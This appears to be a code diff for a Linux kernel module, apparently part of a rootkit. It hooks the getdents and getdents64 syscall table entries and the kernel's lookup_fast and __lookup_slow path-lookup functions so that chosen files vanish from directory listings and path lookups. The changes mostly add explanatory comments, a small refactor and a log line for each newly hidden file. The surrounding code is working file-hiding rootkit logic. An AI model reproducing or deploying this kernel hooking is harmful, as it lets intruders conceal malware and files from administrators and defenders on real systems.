@@ -52,8 +52,8 @@ static struct dentry *hook___lookup_slow(const struct qstr *name,
 
 // TODO: what about readdir() syscall？
 
-/* Definition of `struct linux_dirent' is missing in headers, let's redefine it
- * here */
+/* Definition of `struct linux_dirent' is missing in kernel headers. So let's
+ * redefine it here */
 struct linux_dirent {
     unsigned long d_ino;
     unsigned long d_off;
@@ -61,6 +61,21 @@ struct linux_dirent {
     char d_name[1];
 };
 
+/**
+ * To reduce code duplication, we create a template to generate hook code for
+ * getdents64() and getdents(), since the syscall getdents64() is similar with
+ * getdents().
+ *
+ * For getdents64()
+ *   hook_func_name: hook_getdents64
+ *   orig_func_name: orig_getdents64
+ *   linux_dirent_type: struct linux_dirent64
+ *
+ * For getdents()
+ *   hook_func_name: hook_getdents
+ *   orig_func_name: orig_getdents
+ *   linux_dirent_type: struct linux_dirent
+ */
 #define HOOK_GETDENTS_TEMPLATE(hook_func_name, orig_func_name,                 \
                                linux_dirent_type)                              \
     static asmlinkage long (*orig_func_name)(const struct pt_regs *);          \
@@ -82,8 +97,7 @@ struct linux_dirent {
         if (ret <= 0)                                                          \
             return ret;                                                        \
                                                                                \
-        /* first, give a quick check if any file under this dir need to be     \
-         * hidden */                                                           \
+        /* first, check if any file under this dir need to be hidden */        \
         file = fget(fd);                                                       \
         if (!file) /* failed to get `struct file *' of this fd */              \
             return ret;                                                        \
@@ -154,7 +168,8 @@ struct linux_dirent {
                 previous_dir = current_dir;                                    \
             }                                                                  \
             offset += current_dir->d_reclen;                                   \
-        next_iter: continue;                                                   \
+        next_iter:                                                             \
+            continue;                                                          \
         }                                                                      \
                                                                                \
         /* finally, copy back to overwrite the original results */             \
@@ -173,18 +188,22 @@ HOOK_GETDENTS_TEMPLATE(hook_getdents64, orig_getdents64, struct linux_dirent64)
 
 DECLARE_HASHTABLE(hide_file_info_list, HIDE_FILE_HASH_TABLE_BITS);
 
-char lookup_fast_name[] = "lookup_fast*";
-
 int hide_file_init(void) {
     hash_init(hide_file_info_list);
 
-    /* forbid looking up hidden files/directories */
-    hook_function_name_add(lookup_fast_name, hook_lookup_fast,
-                           &orig_lookup_fast);
+    /* The lookup_fast() and lookup_slow() is used for kernel to look up a path.
+     * By adding checking in this two function, we can forbid looking up hidden
+     * files/directories.
+     */
+    hook_function_name_add("lookup_fast*", hook_lookup_fast, &orig_lookup_fast);
     hook_function_name_add("__lookup_slow", hook___lookup_slow,
                            &orig___lookup_slow);
 
-    /* hide file from result of getdents() and getdents64() */
+    /* Some commands, e.g. '/bin/ls', is use to read content of a dir. The
+     * syscall getdents() and getdents64() are designed for it. However these
+     * two syscalls are read directly from the file system, and are not related
+     * to lookup_fast() and lookup_slow(). So we need to hide file from results
+     * of getdents() and getdents64(). */
     hook_sys_call_table(__NR_getdents, hook_getdents, &orig_getdents);
     hook_sys_call_table(__NR_getdents64, hook_getdents64, &orig_getdents64);
 
@@ -209,7 +228,7 @@ int hide_file_exit(void) {
     unhook_sys_call_table(__NR_getdents, orig_getdents);
 
     hook_function_del("__lookup_slow");
-    hook_function_del(lookup_fast_name);
+    hook_function_del("lookup_fast*");
 
     release_all_info();
     return 0;
@@ -261,6 +280,8 @@ int hide_file_add(const char *pathname) {
 
     memcpy(name_owned, pathname, hashlen_len(hash_len));
     name_owned[hashlen_len(hash_len)] = '\0';
+
+    pr_info(LOG_PREFIX "new file to hide: %s\n", name_owned);
 
     info->path = (struct qstr){.hash_len = hash_len, .name = name_owned};
     info->dentry = dentry;
